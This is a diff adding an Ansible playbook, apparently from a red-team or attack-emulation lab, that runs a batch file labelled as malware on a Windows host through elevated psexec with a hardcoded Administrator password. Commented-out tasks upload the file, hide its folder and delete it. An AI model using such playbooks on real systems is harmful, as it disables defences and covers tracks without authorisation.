@@ -1,0 +1,36 @@
+-
+  name: Disable Firewall
+  hosts: windowsftp
+  strategy: free
+  gather_facts: no
+  become_method: runas
+  tasks:
+
+#    - name: Upload Malware
+#      win_copy:
+#        src: 'files/net.bat'
+#        dest: 'C:\temp\net.bat'
+#
+#
+    - name: Run powershell as a specific domain user
+      win_psexec:
+        command: powershell.exe C:\temp\net.bat -d
+        executable: C:\Windows\System32\psexec.exe
+        elevated: yes
+        nobanner: yes
+        username: .\Administrator
+        password: Change.me!
+
+#    - name: Run powershell as a specific domain user
+#    - win_shell: Get-Item C:\temp -Force | foreach { $_.Attributes = $_.Attributes -bor "Hidden" }
+#        command: powershell.exe Get-Item .\temp -Force | foreach { $_.Attributes = $_.Attributes -bor "Hidden" }
+#        executable: C:\Windows\System32\psexec.exe
+#        elevated: yes
+#        nobanner: yes
+#        username: SHARK\Administrator
+#        password: Change.me!
+
+#    - name: Remove a file, if present
+#      win_file:
+#        path: C:\temp\net.bat
+#        state: absent
